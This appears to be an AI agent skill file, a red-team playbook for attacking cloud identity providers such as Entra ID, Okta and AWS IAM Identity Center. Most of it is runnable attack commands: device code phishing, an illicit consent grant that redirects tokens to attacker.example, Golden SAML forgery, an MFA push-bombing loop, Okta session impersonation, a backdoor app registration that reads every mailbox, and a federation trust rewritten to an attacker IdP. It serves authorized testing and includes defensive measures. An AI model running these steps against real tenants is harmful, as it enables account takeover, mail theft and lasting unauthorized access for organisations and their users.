---
name: cloud-identity-attack
description: Cloud identity provider attacks covering Azure AD/Entra ID, Okta, Auth0, Ping, AWS IAM Identity Center, and Google Workspace — including OAuth 2.0 token theft, OIDC redirect abuse, SAML response forgery, conditional access bypass, MFA fatigue, federation compromise (AD FS, Ping), app registration abuse, and JIT access exploitation using ROADtools, AADInternals, MicroBurst, MFASweep, TokenTactics, and Okta API probing tools.
origin: github-trending-2026
version: "0.2.0.2"
compatibility: ">=0.1.31"
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - Glob
  - Grep
  - WebFetch
metadata:
  domain: enterprise-cloud
  tool_count: 14
  guide_count: 1
  mitre: "T1078-Valid Accounts (cloud), T1550-Use Alternate Authentication Material (token reuse), T1606-Forge Web Credentials"
  last_reviewed: "2026-07-26"
---




# Skill: Cloud Identity Provider Attack

> **Supplementary Files**:
> - `payloads.md` — Command catalogue for Azure AD/Entra ID, Okta, Auth0, Ping, AWS IAM Identity Center, and Google Workspace — 15 sections with real commands: tenant recon, user/group enum, OAuth 2.0 token theft (TokenTactics, illicit consent, device code), OIDC redirect abuse, SAML forgery (signature wrapping, Golden SAML via AD FS), Conditional Access bypass (legacy auth, MFA fatigue), federation compromise (AD FS/Ping token signing cert), app registration abuse, IAM Identity Center SAML role assumption, Okta API token theft, Auth0 rule injection, Google Workspace OAuth app abuse, MFA bypass, JIT/PIM elevation, persistence (backdoor apps, guest users, federation trust).
> - `test-cases.md` — Structured test cases (TC-CI-001..012): AAD tenant recon, user enum via Graph API, OAuth device code phishing, illicit consent grant, SAML response forgery, Golden SAML via AD FS, Conditional Access bypass via legacy auth, MFA fatigue simulation, Okta API token theft, AWS IAM Identity Center role assumption, JIT/PIM elevation abuse, persistent backdoor app registration.
> - `guides/cloud-identity-attack-playbook.md` — End-to-end red team playbook: scoping → tenant recon → user/group enum → token acquisition → Conditional Access bypass → lateral via app registrations → federation compromise → persistence. Includes pre-engagement checklist, MITRE ATT&CK cloud identity matrix, IdP-by-IdP decision tree, and report template.

## Summary

Cloud identity provider attack skill domain covering modern IdP infrastructure — Azure AD/Entra ID, Okta, Auth0, Ping Identity, AWS IAM Identity Center, and Google Workspace. This skill addresses the modern attack surface that has largely replaced on-premises Active Directory as the primary enterprise identity tier: OAuth 2.0 access tokens, OIDC flows, SAML federation, conditional access policies, MFA enforcement, app registrations, and just-in-time elevation (PIM).

**Tools**: ROADtools (roadrecon, roadtx, roadlib), AADInternals, MicroBurst, MFASweep, TokenTactics, AzureAD/MSOnline PowerShell, Microsoft Graph API/CLI, AzureHound, Okta API tooling, o365creeper, MailSniper, GraphRunner, ScoutSuite (identity audit).

**Domain**: enterprise-cloud

**MITRE ATT&CK**: T1078-Valid Accounts (cloud), T1550-Use Alternate Authentication Material (token reuse), T1606-Forge Web Credentials, T1621-Multi-Factor Authentication Request Generation

## Description

The center of gravity in enterprise identity has shifted. In 2010, the path to "domain admin" went through LDAP and Kerberos against a domain controller on the corporate network. In 2026, the same goal is reached through `login.microsoftonline.com`, `*.okta.com`, or `auth0.com` — HTTPS endpoints issuing OAuth 2.0 bearer tokens that grant access to email, file shares, code repositories, billing systems, and the cloud control plane itself. This skill is the cloud counterpart to `ad-ldap-attack`: where that skill covers LDAP/Kerberos/NTLM against on-prem AD, this skill covers OAuth/OIDC/SAML/Bearer tokens against cloud identity providers.

This skill covers the eight things that distinguish modern cloud identity attacks from on-premises AD attacks:

1. **The IdP is the new domain controller** — Azure AD/Entra ID is the authority behind Microsoft 365, Azure, and thousands of SaaS apps via federation. Okta is the same for a different set of enterprises. Whoever controls a privileged identity in the IdP controls the SSO estate. The SolarWinds Orion supply-chain attack (SUNBURST, 2020) included the **Golden SAML** technique — forging SAML tokens using the AD FS token-signing certificate — to read mail at the Department of Treasury and DHS CISA. This is the cloud equivalent of the Golden Ticket.

2. **Tokens, not passwords, are the credential** — Cloud IdPs issue short-lived bearer tokens (OAuth 2.0 access tokens, refresh tokens, ID tokens, SAML assertions). Once stolen, a refresh token is reusable for hours to days and a primary refresh token (PRT) is reusable for up to 90 days across devices. The pass-the-hash of cloud is "pass-the-refresh-token". LAPSUS$ used stolen session tokens (via redirector/MFA fatigue) to compromise Okta, Microsoft, Samsung, NVIDIA, and Uber in 2022.

3. **Conditional Access is the new firewall — and has the same bypass classes** — Conditional Access (CA) policies in Entra ID, Okta sign-on policies, and Auth0 rules decide which authentication requests are allowed based on user, device, location, app, and risk. Bypasses: legacy authentication (POP/IMAP/SMTP basic auth — Microsoft disabled this in Oct 2022 but tenants lag), excluded apps, device-state spoofing (UUID/GUID, certificate cloning), location spoofing (Apple iCloud Private Relay, Tor, residential proxies), MFA fatigue (push-bombing), and password spray from "trusted" IP ranges.

4. **Federation is a trust graph, and trust is bidirectional** — Entra ID federates with on-prem AD FS, Okta federates with Entra ID and AD, Ping federates with everything. The trust boundary is the **token-signing certificate** of the IdP. Compromise AD FS' `TokenSigning` certificate → forge SAML assertions as any user → bypass MFA entirely. Microsoft patched CVE-2022-26923 (certifried) for the on-prem side, but the **federation trust itself** is a long-lived secret that defenders rotate once a decade.

5. **App registrations and service principals are the new service accounts** — Every API integration, every CI/CD pipeline, every SaaS connection is backed by an app registration with client ID + secret (or certificate). Over-privileged service principals (`Company Administrator`, `Application.ReadWrite.All`, `AppRoleAssignment.ReadWrite.All`) are the new Domain Admins. MicroBurst, AADInternals, and AzureHound enumerate these. A single misconfigured `Mail.Read` app can exfiltrate every mailbox in the tenant.

6. **MFA is bypassable at the user, not the protocol** — TokenTactics generates OAuth tokens for high-value Microsoft first-party apps (Microsoft Graph, Outlook, Azure CLI, Microsoft Teams) using illicit consent grants or device code phishing — and MFA is satisfied because the token was issued to a *trusted* app that *already had* MFA at grant time. MFASweep probes Microsoft services for legacy endpoints that don't enforce MFA (ActiveSync, IMAP, SMTP-AUTH). The MFA fatigue attack (LAPSUS$ on Cisco, 2022) sends dozens of push prompts until the user taps "approve".

7. **JIT access is the new privileged access management — and is exploitable** — Entra ID Privileged Identity Management (PIM), AWS IAM Identity Center permission sets, and Okta JIT user provisioning all expose "elevation APIs" — a low-privileged user who can self-activate a role, modify a permission set, or trigger JIT provisioning can escalate. The pattern: enumerate who can activate what → find a self-service path → trigger elevation → use the new role for 5 minutes → revert.

8. **Guest users and federation trusts are persistence goldmines** — Once an attacker has any write access to the tenant (Company Administrator, Application Administrator, or even a User Administrator with the right group membership), persistence is trivial: create a new app registration with `Mail.Read`, invite a guest user with privileged group membership, or establish a new federation trust pointing to attacker-controlled SAML IdP. These persist across password resets and MFA re-enrollment because they are not tied to a single user.

**Difference from `ad-ldap-attack`**: ad-ldap-attack covers LDAP, Kerberos (AS-REP, Kerberoasting, Golden/Silver Ticket), NTLM (pass-the-hash), and on-prem AD dominance against a domain controller reachable on TCP 389/445/88. This skill covers OAuth 2.0, OIDC, SAML, and bearer tokens against cloud IdPs reachable on TCP 443 via HTTPS/JSON. The overlap (e.g., on-prem AD FS federated with Entra ID) is the federation compromise section — this skill handles the cloud side, ad-ldap-attack handles the AD side.

**Difference from `cloud-security`**: cloud-security covers the cloud provider control plane broadly — AWS IAM (users, roles, policies, S3, IMDS), Azure Resource Manager (compute, storage, network), GCP IAM. This skill narrows to the **identity provider layer** — the IdP that issues tokens to those cloud providers. Compromise Entra ID → forge tokens for Azure RM. Compromise Okta → forge SAML for AWS IAM Identity Center → assume AWS role.

**Difference from `web-auth-bypass`**: web-auth-bypass covers generic web authentication flaws — broken session management, JWT signature confusion, password reset poisoning, 2FA bypass at the application layer. This skill specializes in identity-provider-issued tokens and protocols (OAuth 2.0 flows, OIDC redirect URIs, SAML signature wrapping) and the commercial IdP products (Entra ID, Okta, Auth0, Ping).

**Difference from `password-attack`**: password-attack covers credential attacks — hashcat/john for offline cracking, password spraying, credential stuffing. This skill covers token acquisition (OAuth device code, illicit consent, primary refresh token theft) and token replay, where the "credential" is a bearer token rather than a password. Password spraying against Entra ID is the bridge between the two skills.

**Difference from `post-exploitation`**: post-exploitation covers general post-compromise activities on a host (persistence, data theft, cleanup). This skill's persistence (backdoor app registrations, federation trust tampering, guest user invite) is identity-layer-specific and lives in the IdP, not on a single host.

## Use Cases

- **Cloud identity red team**: Starting from a harvested refresh token, a phishing-captured device code, or an external position, chain OAuth token theft → Microsoft Graph enumeration → over-privileged service principal discovery → Conditional Access bypass → privilege escalation → cross-cloud pivot via federation.
- **Azure AD/Entra ID tenant assessment**: Given guest access, an unauthenticated external position, or compromised low-priv creds, enumerate users, groups, app registrations, conditional access policies, and federation trusts; document every path to Global Administrator.
- **Okta tenant assessment**: With a stolen Okta API token or session cookie, enumerate users, groups, applications, sign-on policies, and federation trusts; identify over-privileged admins, weak MFA enrollment, and exposed API tokens in CI.
- **OAuth/OIDC application security review**: Audit a custom application's OAuth 2.0 flow for redirect URI validation gaps, state confusion, PKCE bypass, scope over-granting, and refresh-token leakage. Test third-party apps' consent prompts for illicit grant potential.
- **SAML federation attack validation**: When an organization uses AD FS or Ping federated with Entra ID, attempt Golden SAML (forge assertions using the token-signing cert), SAML response signature wrapping, and relay-state injection — and validate the federation trust's rotation posture.
- **Conditional Access bypass audit**: Enumerate CA policies (where readable), test for legacy authentication endpoints that bypass CA (POP3, IMAP, SMTP-AUTH, EAS), test excluded applications, test MFA fatigue on push-based enrollment, test device-state spoofing, and document every bypass class.
- **MFA bypass and fatigue testing**: Validate whether the tenant is vulnerable to MFA push-bombing (Okta, Microsoft Authenticator), SIM swap (SMS-based MFA), backup code leak, and OAuth-app-level bypass (where the token was issued pre-MFA to a high-value app).
- **Just-in-time (PIM/Identity Center) abuse**: Identify users with PIM-eligible roles, test for self-service activation paths, identify IAM Identity Center permission-set abuse, and demonstrate cross-account escalation via JIT elevation + immediate action + deactivation.
- **Cloud-to-cloud pivot via federation**: From a compromised Entra ID tenant, pivot to AWS via IAM Identity Center SAML trust, to Google Workspace via federation, or to a SaaS app via SSO. Pivot back: from a SaaS app OAuth token, escalate to the issuing IdP.
- **Incident response support (defender side)**: Given Indicators of Compromise (anomalous refresh token issuance, unexpected app consent, sign-ins from new locations), trace the attack chain, scope the compromise, identify persistence (rogue apps, federation trust tampering), and document for forensics.

## Core Tools

### Azure AD/Entra ID & Federation

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **ROADtools** (roadrecon, roadtx, roadlib) | The reference Azure AD attack suite — recon, auth, token manipulation | `python roadrecon auth --device-code`; `python roadtx.py gettokens` |
| **AADInternals** | PowerShell Swiss-army knife for Azure AD — federation,365 reconnaissance, mailbox manipulation | `Import-Module AADInternals; Get-AADIntTenantDomains` |
| **MicroBurst** | Azure reconnaissance, enumeration, blob/secret hunting | `Invoke-EnumerateAzureSubDomains -Base corp`; `Get-AzurePasswords` |
| **AzureHound** | BloodHound ingestor for Azure AD — graph attack paths | `azurehound-cli list users --jwt <token>` |
| **AzureAD / MSOnline PowerShell** | Official modules — enumeration with valid creds | `Connect-AzureAD`; `Get-AzureADUser -All $true` |
| **Microsoft Graph CLI / API** | Modern API for user/group/app enumeration | `az rest --method get --url https://graph.microsoft.com/v1.0/users` |
| **MFASweep** | Check Microsoft services for MFA enforcement gaps | `Invoke-MFASweep -Username u -Password p` |
| **TokenTactics** (formerly OAuth2Toolkit) | Generate OAuth tokens for high-value Microsoft apps via device code | `python tokenTactics.py get-token --client azure` |

### Okta / Auth0 / Ping / AWS IC / Google Workspace

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **okta-cli / okta-terraform** | Okta API client — user/group/app enumeration | `okta-cli users list --token <api-token>` |
| **o365creeper / MailSniper** | Enumerate valid O365 email addresses, EXO enumeration | `Invoke-ASMiMisc -Email <user>` |
| **GraphRunner** | Microsoft 365 / Graph post-exploitation suite | `python3 GraphRunner.py auth --refresh-token <token>` |
| **ScoutSuite** | Multi-cloud config auditor — identity findings per provider | `scout azure --cli; scout aws --cli` |
| **AWS CLI + aws-iam-creator / pacu** | AWS IAM Identity Center enumeration, role assumption | `aws sso list-accounts --access-token <token>` |

## Methodology

### Cloud Identity Six-Phase Workflow

```
Phase 1            Phase 2            Phase 3            Phase 4            Phase 5            Phase 6
Tenant Recon   →   User/Group Enum  → Token Acquisition → CA Bypass      →   Lateral via Apps →   Persistence +
& Foothold         (Graph/Okta)      (OAuth/SAML/RT)     (Legacy/MFA        + Federation        Backdoor
                   │                 │                   Fatigue)           Compromise          Federation Trust
   │                 │                 │                   │                  │                  │
   ▼                 ▼                 ▼                   ▼                  ▼                  ▼
 OpenID config,    Graph API,       Device code flow,   Legacy auth       App registration   Rogue app,
 tenant GUID,      AzureAD/MSOnline  illicit consent     (POP/IMAP/SMTP),  over-priv,         guest user,
 DNS TXT,          PowerShell,       grant, TokenTactics MFA fatigue,      service principal  federation trust
 AADInternals      Okta API,         for Microsoft       excluded app,     → cross-cloud      rewrite, PIM-
 tenant enum       OAuth endpoints   Graph/Outlook       location spoof    SAML to AWS IC     eligible elevation
```

**Phase 1: Tenant Recon & Foothold** — Identify the target IdP, tenant GUID, federation config (OIDC discovery at `/.well-known/openid-configuration`, SAML metadata at `FederationMetadata/2007-06/FederationMetadata.xml`), authentication endpoints, and DNS TXT records indicating tenant ownership (`Get-AADIntTenantDomains`). Establish a foothold via phishing (device code, consent grant), leaked credentials, or external recon. Tools: AADInternals, MicroBurst, manual HTTP/curl, `nmap` against exposed endpoints.

**Phase 2: User/Group/App Enumeration** — With any foothold (guest account, low-priv user, OAuth app with `User.ReadBasic.All`), enumerate users, groups, app registrations, service principals, conditional access policies, and federation trusts. Microsoft Graph (`/users`, `/groups`, `/applications`, `/servicePrincipals`), AzureAD PowerShell (`Get-AzureADUser`, `Get-AzureADServicePrincipal`), Okta API (`/api/v1/users`, `/api/v1/apps`), Google Workspace Admin SDK. ROADtools `roadrecon` does this comprehensively against AAD and outputs a SQLite DB.

**Phase 3: Token Acquisition** — Acquire tokens usable across the IdP ecosystem. Techniques: device code phishing (`roadrecon auth --device-code` → user completes at `microsoft.com/devicelogin`), primary refresh token (PRT) theft from compromised Windows endpoints, illicit consent grant (register an app with `Mail.Read` and trick a user into consenting), password spray + legacy auth for MFA-bypassed tokens, refresh-token theft from cookie stores. TokenTactics generates app-specific tokens for Microsoft Graph, Outlook, Azure CLI, Teams — each grants the scope of that app.

**Phase 4: Conditional Access Bypass** — Defeat the IdP's policy layer. Legacy authentication endpoints (POP3, IMAP, SMTP-AUTH, Exchange ActiveSync) often bypass CA and MFA in tenants that haven't blocked them — MFASweep tests this. Excluded applications in CA policies (often service-principal-based apps) bypass enforcement. MFA fatigue (push-bombing) on Microsoft Authenticator / Okta Verify / Duo yields a valid session via the user's tap. Location spoofing via Apple iCloud Private Relay, residential proxies, or a foothold in a "trusted" country bypasses location-based CA. Device-state spoofing (registering a fake device, cloning a device cert) bypasses device-based CA.

**Phase 5: Lateral Movement via Apps + Federation Compromise** — Convert one token into many. A token for one app (Outlook) → trigger cross-app token exchange (OAuth `exchange` flow) → token for Microsoft Graph → escalate. Over-privileged service principals (`Mail.ReadWrite`, `Application.ReadWrite.All`) escalate to app-owner-impersonation and even tenant-wide admin. Federation compromise: extract the AD FS `TokenSigning` certificate (via DKM key share path on-prem) → forge SAML assertions as any user → bypass MFA because the assertion claims MFA was satisfied at the IdP. Golden SAML. The same pattern applies to Ping, Okta-as-IdP, and any SAML federation.

**Phase 6: Persistence** — Establish access that survives password resets, MFA re-enrollment, and even admin review. Backdoor app registration: create a new app with `Mail.Read`, consent it as the compromised admin, then call Graph with the app's token indefinitely. Guest user backdoor: invite an attacker-controlled external account as a guest, add it to a privileged group. Federation trust tampering: in Entra ID, an attacker with the right role can add a new SAML federation trust pointing to attacker-controlled IdP — any future sign-in to that domain is intercepted. PIM-eligible role activation: grant a low-priv user PIM eligibility to Global Administrator, activate only when needed.

### Quick Selection Guide

| Scenario | Primary Approach | Alternative |
|----------|------------------|-------------|
| Unauthenticated external recon | `AADInternals: Get-AADIntTenantDomains -Domain corp.com` → OIDC discovery → user enum via auth timing | MicroBurst `Invoke-EnumerateAzureSubDomains` |
| Have low-priv user creds | `Connect-AzureAD` → `Get-AzureADUser -All $true`; `roadrecon auth` + `roadrecon gather` | Graph API directly via `az rest` or curl |
| Phishing for tokens | Device code flow: `roadrecon auth --device-code` send code to victim; or illicit consent grant | TokenTactics `get-token --client azure` |
| MFA-protected target | Try legacy auth (MFASweep) first; if blocked, MFA fatigue (push-bomb); if blocked, OAuth-app-level bypass | Steal refresh token from compromised device |
| Stolen refresh token | Decode (JWT), identify scope/audience, replay at Graph/Outlook | Exchange for access tokens with roadtx refresh |
| AD FS in scope | Extract `TokenSigning` cert (need DA on-prem or DKM key) → forge SAML via ADFSSigningTools / `New-AADIntSAMLToken` | Repeat the well-known ADFS-dump toolchain |
| Okta target | `okta-cli users list` with stolen API token; or session cookie replay | Test MFA fatigue on Okta Verify |
| AWS IC pivot | Enumerate SAML trusts; forge SAML for AWS, assume role via `aws sts assume-role-with-saml` | Steal IAM IC access token directly |
| Google Workspace | OAuth app abuse (third-party app consent); service account + Domain-Wide Delegation | Admin SDK API with stolen admin creds |
| Persistence needed | New app registration with `Mail.Read`, consent via Global Admin; or guest user invite to privileged group | Add new federation trust (writes a SAML IdP config) |
| Defender (audit/IR) | ScoutSuite audit; review Entra ID sign-in logs for anomalous tokens; review app consent history | AzureHound graph for blast-radius mapping |

### Defense Perspective

| Defense Measure | Description |
|-----------------|-------------|
| **Disable legacy auth** | Block POP3, IMAP, SMTP-AUTH, EAS at the tenant level. Entra ID disabled basic auth for Exchange Online in Oct 2022; verify no per-user overrides. CA policy "Block legacy authentication" is mandatory. |
| **Conditional Access coverage** | Every privileged role covered by CA: MFA required, compliant device required, sign-in risk < medium, location restricted. Audit excluded apps quarterly. |
| **Continuous Access Evaluation (CAE)** | Enable CAE for critical apps — sessions are revoked in near-real-time on policy change, account disable, or password change. Reduces refresh-token replay window. |
| **Identity Protection** | Enable user/risk-based policies: high-risk users blocked, high-risk sign-ins challenged. Tune risk thresholds to your user population. |
| **PIM with approval + MFA** | Every privileged role (Global Admin, Application Admin, User Admin, Exchange Admin) must be PIM-eligible with approver + MFA + audit. Maximum activation 4h, not 8h+. |
| **App registration governance** | Block self-service app registration. Require admin consent for any `Mail.Read`/`Mail.ReadWrite`/`Files.Read`/`Application.ReadWrite.All` scope. Quarterly review of all app consents. |
| **Federation hygiene** | AD FS token-signing cert rotation every 1-2 years (not 5-10). Audit federation trusts quarterly. Block RDP to AD FS servers; HSM-backed keys where possible. |
| **MFA hardening** | Number-matching in Microsoft Authenticator (defeats push-bomb). Phishing-resistant MFA (FIDO2, Windows Hello for Business) for admins. Disable SMS-based MFA for admin accounts. |
| **Service principal least privilege** | Audit every service principal's appRole assignments quarterly. No `Company Administrator`, no `Application.ReadWrite.All` for production apps. Use Managed Identities for Azure-hosted apps. |
| **Guest user review** | Quarterly review of guest accounts and their group memberships. Block guest users from privileged groups. |
| **Audit log retention + SIEM** | Retain Entra ID audit + sign-in logs for 1+ year. Pipe to SIEM with alerts on: new app consent, new federation trust, PIM activation, sign-ins from new country, MFA fatigue pattern (>5 denials in 5 min). |
| **Token replay detection** | Microsoft Defender for Cloud Apps: anomaly detection for token replay from new user agent / new IP / impossible travel. Block refresh tokens older than 24h on policy change. |

## Practical Steps

> **Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`.**

### Exercise 1: Azure AD Tenant Recon (Unauthenticated)

```bash
# Identify the tenant GUID and verified domains
Import-Module AADInternals
Get-AADIntTenantDomains -Domain corp.com
# Returns: tenant GUID, verified domains, federated domains, custom domains

# OpenID Connect discovery (works for any OIDC IdP)
curl -s https://login.microsoftonline.com/corp.com/.well-known/openid-configuration \
  | jq '.issuer, .authorization_endpoint, .token_endpoint, .device_authorization_endpoint'

# AD FS federation metadata (if corp.com is federated)
curl -s https://login.microsoftonline.com/corp.com/FederationMetadata/2007-06/FederationMetadata.xml

# DNS TXT records often reveal tenant ownership
dig +short TXT corp.com
# Look for: MS=msXXXXXXX (Microsoft 365 tenant verification)
```

### Exercise 2: User/Group Enumeration via Microsoft Graph

```bash
# Authenticate with valid creds (low-priv is fine for User.ReadBasic.All)
Connect-AzureAD -TenantId <tenant-guid>
Get-AzureADUser -All $true | Select UserPrincipalName, DisplayName, JobTitle
Get-AzureADGroup -All $true | Select DisplayName, Description
Get-AzureADServicePrincipal -All $true | Select DisplayName, AppId, AppRoles

# Equivalent via Graph API (modern path)
az login --use-device-code
az rest --method get --url https://graph.microsoft.com/v1.0/users --query 'value[].userPrincipalName'
az rest --method get --url https://graph.microsoft.com/v1.0/applications

# Comprehensive dump with ROADtools
python roadrecon auth --device-code
python roadrecon gather --roadrecon-auth-file .roadtools_auth
python roadrecon gui --database roadrecon.db    # SQLite UI for browsing users/apps/CA
```

### Exercise 3: OAuth Device Code Phishing for Microsoft Graph Token

```bash
# Attacker initiates device code flow on behalf of victim's tenant
python roadrecon auth --device-code --tenant corp.com
# Output: enter code ABCDE1234 at https://microsoft.com/devicelogin
# Phish the code to the victim (email, Teams, fake login page)
# Victim completes auth → attacker receives access + refresh tokens for Microsoft Graph

# Or use TokenTactics to target a specific app (Outlook, Teams, Azure CLI)
python tokenTactics.py get-token --client outlook --tenant corp.com
# Generates a device code targeting Outlook — victim consents Outlook scopes

# Decode the resulting JWT
echo $ACCESS_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# Inspect: aud, scp (scopes), appid, oid (user), tenant id, expiration
```

### Exercise 4: Illicit Consent Grant (App Registration Abuse)

```bash
# 1. Attacker registers an app in their own tenant (or a victim tenant they compromised)
#    Redirect URI: https://attacker.example/callback
#    Requested scopes: Mail.Read, User.Read, offline_access

# 2. Construct the consent URL for the victim's tenant
# https://login.microsoftonline.com/organizations/v2.0/adminconsent
#   ?client_id=<attacker-app-id>
#   &scope=https://graph.microsoft.com/Mail.Read offline_access
#   &redirect_uri=https://attacker.example/callback

# 3. Victim (any user who can consent, or admin for tenant-wide) clicks → consents
# 4. Attacker receives authorization code at redirect_uri → exchanges for access + refresh token

# 5. Use the access token to read mail
curl -H "Authorization: Bearer $ACCESS_TOKEN" https://graph.microsoft.com/v1.0/me/messages
```

### Exercise 5: Conditional Access Bypass via Legacy Authentication

```bash
# MFASweep — check which Microsoft services accept legacy (non-MFA) auth
Import-Module MFASweep
Invoke-MFASweep -Username 'victim@corp.com' -Password 'P@ssw0rd'
# Output per service: AOWS, EWS, IMAP, POP, SMTP, EAS — which require MFA, which don't

# Manual legacy auth via IMAP (often bypasses CA in tenants that haven't blocked it)
# Using a tool like swaks or hydra against imap.office365.com:993
swaks --to victim@corp.com --from attacker@example.com --server outlook.office365.com:993 \
  --auth LOGIN --auth-user victim@corp.com --auth-password 'P@ssw0rd' -tls --port 993
```

### Exercise 6: SAML Response Forgery (Golden SAML)

```bash
# Prerequisites: AD FS TokenSigning certificate (extracted via DA + DKM, or HSM bypass)
# AADInternals can forge SAML from the cert
Import-Module AADInternals
$cert = Import-PfxCertificate -FilePath TokenSigning.pfx -Password (ConvertTo-SecureString '...' -AsPlain -Force)
$token = New-AADIntSAMLToken -ImmutableId 'victim@corp.com' -Issuer 'http://adfs.corp.com/adfs/services/trust' \
  -Certificate $cert -Audience 'urn:federation:MicrosoftOnline' -Expiry (Get-Date).AddHours(2)
# Use the SAML assertion to authenticate to Entra ID — bypasses MFA because
# the assertion contains an authentication method claim stating MFA was satisfied at AD FS.
Open-AADIntOffice365Portal -SAMLToken $token
```

### Exercise 7: MFA Fatigue (Push-Bombing)

```bash
# Trigger repeated MFA prompts on the victim's device
# Method: spam a login endpoint that initiates MFA — each attempt pushes a notification
# Microsoft: send POST to /common/SAS/ProcessAuth with the victim's UPN
# Okta: send POST to /api/v1/authn with the victim's username — each call triggers Okta Verify push

# Note: This is a known attack (LAPSUS$ used it against Cisco in 2022).
# Defenders: enable number-matching in Microsoft Authenticator (default since 2023).

# Demonstration (in authorized scope):
for i in {1..20}; do
  curl -s -X POST https://corp.okta.com/api/v1/authn \
    -H 'Content-Type: application/json' \
    -d '{"username":"victim@corp.com"}' &
done; wait
```

### Exercise 8: Okta API Token Theft and Replay

```bash
# Okta API tokens are SSWS (Static Wrapped Secret) tokens — long-lived, bearer
# Format: SSWS <base64(api-token-id:secret)>

# Enumerate once you have a token
export OKTA_API_TOKEN='SSWS xxxxxxxxxxxxxxxxxx'
curl -s -H "Authorization: $OKTA_API_TOKEN" https://corp.okta.com/api/v1/users | jq '.[].profile.login'
curl -s -H "Authorization: $OKTA_API_TOKEN" https://corp.okta.com/api/v1/apps | jq '.[].label'
curl -s -H "Authorization: $OKTA_API_TOKEN" https://corp.okta.com/api/v1/groups | jq '.[].profile.name'

# Impersonate a user (requires the user's userId)
curl -s -X POST -H "Authorization: $OKTA_API_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"userId": "00u1xxxxx"}' \
  https://corp.okta.com/api/v1/sessions?additionalFields=cookieToken
# Returns a session cookie for the victim user — full SSO
```

### Exercise 9: AWS IAM Identity Center SAML Role Assumption

```bash
# From a stolen Entra ID / Okta SAML assertion that targets AWS IC
# (the assertion lists aws:Role:Arn + aws:Principal:Arn pairs)

aws sts assume-role-with-saml \
  --role-arn arn:aws:iam::111122223333:role/MyAppRole \
  --principal-arn arn:aws:iam::111122223333:saml-provider/OktaIdP \
  --saml-assertion "$(base64 -w0 assertion.xml)" \
  --duration-seconds 3600

# Returns AWS creds (AccessKeyId, SecretAccessKey, SessionToken)
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
```

### Exercise 10: JIT (PIM) Elevation Abuse

```bash
# PIM-eligible roles can be activated by eligible users
# Step 1: enumerate your PIM eligibility
az rest --method get --url "https://management.azure.com/providers/Microsoft.Authorization/roleEligibilitySchedules?api-version=2020-10-01&\$filter=principalId eq '$(az ad signed-in-user show --query id -o tsv)'"

# Step 2: activate a role you're eligible for
az rest --method post \
  --url "https://management.azure.com/providers/Microsoft.Authorization/roleAssignmentScheduleRequests?api-version=2020-10-01" \
  --body '{"properties":{"PrincipalId":"<you>","RoleDefinitionId":"<role>","RequestType":"SelfActivate","ScheduleInfo":{"StartDateTime":"2026-06-17T12:00:00Z","Expiration":{"Type":"AfterDuration","Duration":"PT4H"}},"Justification":"Incident response"}}'

# Step 3: act with the elevated role for the window, then revert
```

### Exercise 11: Persistence via Backdoor App Registration

```bash
# Create a new app registration with broad Graph permissions
# (requires Application Administrator or Global Admin)

# 1. Register the app (via Graph API)
az ad app create --display-name 'Contoso-Backup-Sync' \
  --is-fallback-public-client false \
  --required-resource-accesses '[{"resourceAppId":"00000003-0000-0000-c000-000000000000","resourceAccess":[{"id":"e1fe6dd8-ba31-4d61-89e7-88639da4683d","type":"Scope"},{"id":"024d486e-b451-40bb-833d-3e28d5d60bb0","type":"Scope"}]}]'
# e1fe6dd8-... = User.Read; 024d486e-... = Mail.Read

# 2. Create a service principal
az ad sp create --id <app-id>

# 3. Consent as Global Admin (tenant-wide)
az ad app permission admin-consent --id <app-id>

# 4. Now the app can read every mailbox via client-credentials flow (no user interaction)
# Persist indefinitely — survives password resets, MFA re-enrollment, user deletion
```

### Exercise 12: Federation Trust Tampering (Persistence)

```bash
# As Global Admin, modify the federation trust to add an attacker-controlled SAML IdP
# This means future sign-ins to that domain can be intercepted by the attacker
Import-Module AADInternals
Set-AADIntDomainFederation -DomainName 'corp.com' \
  -IssuerUri 'http://adfs.corp.com/adfs/services/trust' \
  -ActiveLogOnUri 'https://attacker.example/adfs/services/trust/2005/usernamemixed' \
  -PassiveLogOnUri 'https://attacker.example/adfs/ls' \
  -SigningCertificate (Get-Content attacker-signing.cer)

# Future sign-ins to corp.com will redirect to attacker.example — attacker forges
# SAML assertions on demand. Survives tenant admin password reset because the
# federation trust config is the persistence, not the admin account.
```

## Common Pitfalls

- **Assuming MFA = secure**: MFA blocks password-based auth, but OAuth refresh tokens and SAML assertions were issued *after* MFA was satisfied — they bypass MFA entirely. The bypass target is the token, not the password.
- **Treating app consent as user consent**: A user can consent to `User.Read` for an app, but `Mail.Read` and other high-privilege scopes require admin consent in well-configured tenants. Don't assume consent was granted just because the app exists — check whether admin consent was performed.
- **Forgetting the federation trust is the long-lived secret**: AD FS token-signing certs often don't rotate for 5-10 years. Defenders may have rotated passwords and re-enrolled MFA but never touched the federation trust. Audit the trust, not just the users.
- **Underestimating service principal blast radius**: One over-privileged service principal with `Application.ReadWrite.All` can create new apps that escalate further — and these don't show up in user-focused audit logs. Audit service principal activity separately.
- **Token scope confusion**: An access token for Microsoft Graph (`aud=Graph`) cannot be replayed against Outlook (`aud=Outlook`). But a refresh token (with `offline_access`) can be exchanged for new access tokens for different audiences — refresh tokens are the multi-pass.
- **Ignoring guest users as persistence**: Guest users are easily overlooked in privileged group reviews. Their UPN is in another tenant, so they blend into reports. Audit guest users separately and quarterly.
- **Conditional Access "excluded apps"**: A CA policy that requires MFA but excludes Exchange Online SMTP (for legacy apps) effectively excludes SMTP from MFA — which is exactly the legacy auth bypass. Review excluded apps in every policy.
- **PIM activation ≠ PIM audit**: Activating a PIM role creates an audit event but the activation may not be reviewed for hours. Attackers who can self-activate + complete their action within the activation window + deactivate can operate "below the radar" if alerts aren't tuned.

## Safety Notes

- **Production tenants**: any action that creates app registrations, modifies federation trusts, or activates PIM roles has blast radius in production. Do active exploitation in a test tenant (free with a Microsoft 365 Developer Program subscription). Microsoft provides demo tenants for testing.
- **OAuth phishing**: device code phishing and illicit consent grants target real users. Ensure the engagement scope explicitly covers user-targeted social engineering; some engagements are infrastructure-only.
